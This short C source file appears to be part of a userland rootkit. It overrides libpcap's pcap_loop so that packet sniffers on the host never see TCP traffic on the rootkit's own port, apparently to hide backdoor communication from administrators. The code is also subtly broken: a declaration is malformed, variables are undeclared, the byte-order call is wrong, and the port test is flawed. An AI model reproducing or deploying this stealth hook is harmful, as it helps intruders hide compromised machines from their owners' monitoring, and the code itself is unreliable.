#include <pcap/pcap.h> 
#include <netinet/in.h> 
#include "rkconst.h" 
#include "pcap.h" 

int (*old_pcap_loop)pcap_t *p, int cnt, pcap_handler callback, u_char *user); 

void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{ 
	const struct sniff_ip *ip; 
	const struct sniff_tcp *tcp; 
	int size_ip; 
	int size_tcp; 
	
	ip = (struct sniff_ip*)(packet + SIZE_ETHERNET); 
	size_ip = IP_HL(ip)*4; 
	if (size_ip < 20)
	{ 
		#ifdef DEBUG 
		printf("[!] invalid IP header length: %u bytes\n", size_ip); 
		#endif 
		return;
	}
	
	if (ip->ip_p != IPPROTO_TCP) 
	{
		if (old_callback)
			old_callback(args, header, packet); 
		return; 
	}
	
	tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip); 
	size_tcp = TH_OFF(tcp)*4; 
	if (size_tcp < 20)
	{ 
		#ifdef DEBUG 
		printf("[!] invalid TCP header length: %u bytes\n", size_tcp); 
		#endif 
		return; 
	}
	sport = htons(tcp->th_sport); 
	dport = htons(tcp->th_dport); 

	if ((sport != DEFAULT_PORT) || (dport != DEFAULT_PORT))
	{ 
		if (old_callback)
			old_callback(args, header, packet); 
	}
	
	return; 
} 

int pcap_loop(pcap_t *p, int cnt, pcap_handler callback, u_char *user)
{ 
	#ifdef DEBUG 
	printf("[!] pcap_loop hooked\n"); 
	#endif 

	old_callback = callback; 
	HOOK(pcap_loop); 
	return old_pcap_loop(p, cnt, got_packet, user);
}
			 
